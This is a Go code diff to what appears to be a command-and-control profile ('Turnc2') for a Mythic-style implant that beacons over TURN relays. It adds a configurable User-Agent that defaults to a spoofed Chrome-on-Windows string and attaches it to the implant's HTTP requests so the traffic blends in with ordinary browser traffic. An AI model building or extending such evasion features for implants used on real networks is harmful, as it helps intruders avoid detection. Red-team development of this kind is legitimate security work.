@@ -67,6 +67,7 @@ type Turnc2InitialConfig struct {
 	Jitter                 uint
 	EncryptedExchangeCheck bool
 	AESPSK                 string
+	UserAgent              string
 }
 
 func (e *Turnc2InitialConfig) UnmarshalJSON(data []byte) error {
@@ -111,6 +112,9 @@ func (e *Turnc2InitialConfig) UnmarshalJSON(data []byte) error {
 	if v, ok := alias["AESPSK"]; ok {
 		e.AESPSK = v.(string)
 	}
+	if v, ok := alias["USER_AGENT"]; ok {
+		e.UserAgent = v.(string)
+	}
 	return nil
 }
 
@@ -154,6 +158,7 @@ type C2Turnc2 struct {
 	stoppedChannel        chan bool
 	PushChannel           chan structs.MythicMessage
 	interruptSleepChannel chan bool
+	UserAgent        string
 	// channel to receive messages from the data channel
 	recvChannel      chan []byte
 	// channel to signal data channel is open
@@ -206,6 +211,7 @@ func init() {
 		TurnPassword:          initialConfig.TurnPassword,
 		SDPOffer:              initialConfig.SDPOffer,
 		Key:                   initialConfig.AESPSK,
+		UserAgent:             initialConfig.UserAgent,
 		ShouldStop:            true,
 		stoppedChannel:        make(chan bool, 1),
 		PushChannel:           make(chan structs.MythicMessage, 100),
@@ -224,6 +230,10 @@ func init() {
 	}
 
 	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+
+	if len(profile.UserAgent) == 0 {
+		profile.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+	}
 
 	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
@@ -635,6 +645,7 @@ func (c *C2Turnc2) sendMinimalAnswer(offerID, relayAddr string, relayPort int, i
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", c.UserAgent)
 
 	resp, err := c.httpClient().Do(req)
 	if err != nil {
